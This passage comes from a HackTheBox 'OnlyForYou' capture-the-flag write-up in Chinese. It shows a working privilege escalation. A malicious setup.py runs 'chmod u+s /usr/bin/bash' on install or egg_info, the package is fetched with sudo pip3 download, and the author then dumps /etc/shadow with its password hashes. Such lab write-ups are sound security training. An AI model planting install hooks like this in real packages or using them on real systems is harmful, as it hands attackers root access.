+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mkdir exploitpy</span><br><span class="line">cd exploitpy</span><br><span class="line">touch setup.py</span><br><span class="line">mkdir src</span><br><span class="line">touch src/__init__.py</span><br><span class="line">echo <span class="string">&#x27;print(&quot;hello&quot;)&#x27;</span> &gt; src/main.py</span><br></pre></td></tr></table></figure>
+
+<p>然後修改 <code>setup.py</code>​ 成以下内容，儅pip3 安裝的時候就會執行 <code>RunEggInfoCommand</code>​ 和 <code>RunInstallCommand</code>​：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># setup.py</span></span><br><span class="line"><span class="keyword">from</span> setuptools <span class="keyword">import</span> setup, find_packages</span><br><span class="line"><span class="keyword">from</span> setuptools.command.install <span class="keyword">import</span> install</span><br><span class="line"><span class="keyword">from</span> setuptools.command.egg_info <span class="keyword">import</span> egg_info</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">RunCommand</span>():</span><br><span class="line">	<span class="comment"># Arbitrary code here!</span></span><br><span class="line">	<span class="keyword">import</span> os;os.system(<span class="string">&quot;chmod u+s /usr/bin/bash&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RunEggInfoCommand</span>(<span class="title class_ inherited__">egg_info</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self</span>):</span><br><span class="line">        RunCommand()</span><br><span class="line">        egg_info.run(self)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RunInstallCommand</span>(<span class="title class_ inherited__">install</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self</span>):</span><br><span class="line">        RunCommand()</span><br><span class="line">        install.run(self)</span><br><span class="line"></span><br><span class="line">setup(</span><br><span class="line">    name = <span class="string">&quot;exploitpy&quot;</span>,</span><br><span class="line">    version = <span class="string">&quot;0.0.1&quot;</span>,</span><br><span class="line">    license = <span class="string">&quot;MIT&quot;</span>,</span><br><span class="line">    packages=find_packages(),</span><br><span class="line">    cmdclass=&#123;</span><br><span class="line">        <span class="string">&#x27;install&#x27;</span> : RunInstallCommand,</span><br><span class="line">        <span class="string">&#x27;egg_info&#x27;</span>: RunEggInfoCommand</span><br><span class="line">    &#125;,</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<p>之後打包成pip包：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m build</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-L103fH49novBlG2F-OnlyForYou/image-20241225083417-4gtx5bm.png" alt="image">​</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-L103fH49novBlG2F-OnlyForYou/image-20241225083408-tbx3p0c.png" alt="image">​</p>
+<p>在 <code>dist</code>​ 文件夾裏面得到 <code>*.tar.gz</code>​ 這個文件：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-L103fH49novBlG2F-OnlyForYou/image-20241225083451-doq8hom.png" alt="image">​</p>
+<p>由於沒辦法注冊用戶，所以使用 john 登錄：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-L103fH49novBlG2F-OnlyForYou/image-20241225083553-1x222qa.png" alt="image">​</p>
+<p>然後隨便創建一個公開的項目，這裏就叫 <code>exploit</code>​：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-L103fH49novBlG2F-OnlyForYou/image-20241225083606-mwn9vch.png" alt="image">​</p>
+<p>之後使用 git 把剛剛製作好的 pip 包上傳上去：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git init</span><br><span class="line">git add .</span><br><span class="line">git commit -m <span class="string">&quot;first commit&quot;</span></span><br><span class="line">git remote add origin http://<span class="number">240.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">3000</span>/john/exploit.git</span><br><span class="line">git push -u origin master</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-L103fH49novBlG2F-OnlyForYou/image-20241225083730-udttxnj.png" alt="image">​</p>
+<p>成功了之後會得到：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-L103fH49novBlG2F-OnlyForYou/image-20241225083739-fwylkm1.png" alt="image">​</p>
+<p>點擊那個 <code>tar.gz</code>​ 的文件，右邊有一個raw：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-L103fH49novBlG2F-OnlyForYou/image-20241225083753-n0a0rkq.png" alt="image">​</p>
+<p>複製鏈接后會得到：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://240.0.0.1:3000/john/exploit/raw/master/exploitpy-0.0.1.tar.gz</span><br></pre></td></tr></table></figure>
+
+<p>然後只需要使用 <code>sudo /usr/bin/pip3 download http://127.0.0.1:3000/john/exploit/raw/master/exploitpy-0.0.1.tar.gz</code>​</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-L103fH49novBlG2F-OnlyForYou/image-20241225083858-in099i1.png" alt="image">​</p>
+<p>等安裝完了就可以使用 <code>bash -p</code>​ 得到 root 了。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">bash-5.0# cat /etc/shadow</span><br><span class="line">root:$6$TJLQffVnCXmnRBpq$Shtj6r4nJt672cmV2bhnlK9wb6YlI1tKpJoupUoVM/LFd7vmbLuDX4jtlYW3Lcft2sjWmHk5h58Q8vaFDOtFR.:19326:0:99999:7:::</span><br><span class="line">daemon:*:18863:0:99999:7:::</span><br><span class="line">bin:*:18863:0:99999:7:::</span><br><span class="line">sys:*:18863:0:99999:7:::</span><br><span class="line">sync:*:18863:0:99999:7:::</span><br><span class="line">games:*:18863:0:99999:7:::</span><br><span class="line">man:*:18863:0:99999:7:::</span><br><span class="line">lp:*:18863:0:99999:7:::</span><br><span class="line">mail:*:18863:0:99999:7:::</span><br><span class="line">news:*:18863:0:99999:7:::</span><br><span class="line">uucp:*:18863:0:99999:7:::</span><br><span class="line">proxy:*:18863:0:99999:7:::</span><br><span class="line">www-data:*:18863:0:99999:7:::</span><br><span class="line">backup:*:18863:0:99999:7:::</span><br><span class="line">list:*:18863:0:99999:7:::</span><br><span class="line">irc:*:18863:0:99999:7:::</span><br><span class="line">gnats:*:18863:0:99999:7:::</span><br><span class="line">nobody:*:18863:0:99999:7:::</span><br><span class="line">systemd-network:*:18863:0:99999:7:::</span><br><span class="line">systemd-resolve:*:18863:0:99999:7:::</span><br><span class="line">systemd-timesync:*:18863:0:99999:7:::</span><br><span class="line">messagebus:*:18863:0:99999:7:::</span><br><span class="line">syslog:*:18863:0:99999:7:::</span><br><span class="line">_apt:*:18863:0:99999:7:::</span><br><span class="line">tss:*:18863:0:99999:7:::</span><br><span class="line">uuidd:*:18863:0:99999:7:::</span><br><span class="line">tcpdump:*:18863:0:99999:7:::</span><br><span class="line">landscape:*:18863:0:99999:7:::</span><br><span class="line">pollinate:*:18863:0:99999:7:::</span><br><span class="line">usbmux:*:19326:0:99999:7:::</span><br><span class="line">sshd:*:19326:0:99999:7:::</span><br><span class="line">systemd-coredump:!!:19326::::::</span><br><span class="line">john:$6$BBuIQ1RjM9BXy2zw$5.O1009Bf4oXy/qGS5dp9U514X5GJMbkYBGgcWlmTVCzn3H.E6wF1cVAmjZzf8UCExE0dmfxGylCix6q29icq0:19326:0:99999:7:::</span><br><span class="line">lxd:!:19326::::::</span><br><span class="line">mysql:!:19326:0:99999:7:::</span><br><span class="line">neo4j:!:19327::::::</span><br><span class="line">dev:!:19445:0:99999:7:::</span><br><span class="line">fwupd-refresh:*:19445:0:99999:7:::</span><br><span class="line">_laurel:!:19446::::::</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="Thanks"><a href="#Thanks" class="headerlink" title="Thanks"></a>Thanks</h1><p><strong>Respect</strong>: If my writeup really helps you, <a target="_blank" rel="noopener" href="https://app.hackthebox.com/users/463126">Give me a respect</a> to let me know， Thankssssss!</p>
+<p><strong>感謝</strong>: 製作不易，如果我的writeup真的幫到你了, <a target="_blank" rel="noopener" href="https://app.hackthebox.com/users/463126">給我一個respect</a>，這樣我就會知道，感謝你！</p>
+
+    <iframe src="/maneplugin/badge/htb.html" style="border:none; height: 70px" title="description"></iframe>
+
+
+<p><strong>Found Mistakes</strong>: If you find something wrong in the page, please feel free email to <a href="mailto:&#109;&#x61;&#x6e;&#101;&#x40;&#109;&#97;&#x6e;&#101;&#115;&#101;&#x63;&#x2e;&#x63;&#111;&#x6d;">&#109;&#x61;&#x6e;&#101;&#x40;&#109;&#97;&#x6e;&#101;&#115;&#101;&#x63;&#x2e;&#x63;&#111;&#x6d;</a> thanksss !!!</p>
+<p><strong>發現一些錯誤</strong>: 如果你在文章中發現一些錯誤，請發郵件到 <a href="mailto:&#x6d;&#x61;&#x6e;&#101;&#64;&#x6d;&#97;&#110;&#101;&#x73;&#101;&#x63;&#46;&#x63;&#x6f;&#x6d;">&#x6d;&#x61;&#x6e;&#101;&#64;&#x6d;&#97;&#110;&#101;&#x73;&#101;&#x63;&#46;&#x63;&#x6f;&#x6d;</a> ，麻煩了！！</p>
+<p><strong>Beginner Recommand</strong>: <a target="_blank" rel="noopener" href="https://referral.hackthebox.com/mz8fyQS">If you are a beginner, please use this link to sign up for an HTB Academy to get more Higher level of knowledge.</a></p>
+<p><strong>新手非常推薦</strong>: <a target="_blank" rel="noopener" href="https://referral.hackthebox.com/mz8fyQS">如果你是初學者，可以用此鏈接來嘗試注冊 HTB Academy 賬號。</a></p>
+<p>使用上面的鏈接加入 HTB 的 academy 完成 <code>INTRODUCTION TO ACADEMY</code> 這個模塊后可以解鎖更多的功能！</p>
+<p>Join HTB’s academy with this link to get free access to all the tutorials for Tire 0. This is very beginner friendly. (It is recommended to complete INTRODUCTION TO ACADEMY first)</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <script>
+        setTimeout(() => {
+          makeList({
+             'target': '#toc-mobile',   // Selector for element to place table of contents
+             'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+          });
+        }, 1000);
+      </script>
+    
+    <div id="toc-footer" style="display: none">
+      <div id="toc-mobile"></div>
+    </div>
+
+    <style>
+        #toc-mobile {
+        }
+        #toc-mobile ul {
+           display: grid ! important;
+        }
+        #toc-mobile li {
+           margin: 0 0 0 0 ! important;
+        }
+        #toc-mobile .level-1 {
+           color: #00b4dd ;
+        }
+        #toc-mobile .level-2 {
+           color: #2bbc8a;
+        }
+        #toc-mobile .level-3 {
+           color: #40474b;
+        }
+        #toc-mobile .level-4, #toc-mobile .level-5, #toc-mobile .level-6 {
+           color: #8c8c8c;
+        }
+    </style>
+
+
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://manesec.github.io/2024/12/28/2024-htb-machine/54-OnlyForYou/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://manesec.github.io/2024/12/28/2024-htb-machine/54-OnlyForYou/&text=HackTheBox - Machine - OnlyForYou"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://manesec.github.io/2024/12/28/2024-htb-machine/54-OnlyForYou/&title=HackTheBox - Machine - OnlyForYou"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://manesec.github.io/2024/12/28/2024-htb-machine/54-OnlyForYou/&is_video=false&description=HackTheBox - Machine - OnlyForYou"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HackTheBox - Machine - OnlyForYou&body=Check out this article: https://manesec.github.io/2024/12/28/2024-htb-machine/54-OnlyForYou/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://manesec.github.io/2024/12/28/2024-htb-machine/54-OnlyForYou/&title=HackTheBox - Machine - OnlyForYou"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://manesec.github.io/2024/12/28/2024-htb-machine/54-OnlyForYou/&title=HackTheBox - Machine - OnlyForYou"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://manesec.github.io/2024/12/28/2024-htb-machine/54-OnlyForYou/&title=HackTheBox - Machine - OnlyForYou"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://manesec.github.io/2024/12/28/2024-htb-machine/54-OnlyForYou/&title=HackTheBox - Machine - OnlyForYou"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://manesec.github.io/2024/12/28/2024-htb-machine/54-OnlyForYou/&name=HackTheBox - Machine - OnlyForYou&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://manesec.github.io/2024/12/28/2024-htb-machine/54-OnlyForYou/&t=HackTheBox - Machine - OnlyForYou"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+      
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+  
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2024
+    manesec
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- Add space -->
+<script src="https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js"></script>
+<script>
+  document.addEventListener('DOMContentLoaded', () => {
+    // listen to any DOM change and automatically perform spacing via MutationObserver()
+    pangu.autoSpacingPage();
+  });
+</script>
+
+<!-- fancybox support -->
+
+       <script type="text/javascript" src="/js/fancybox/jquery.fancybox.min.js"></script>
+       <script type="text/javascript" src="/js/wrapImage.js"></script>
+   
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+
+</body>
+</html>
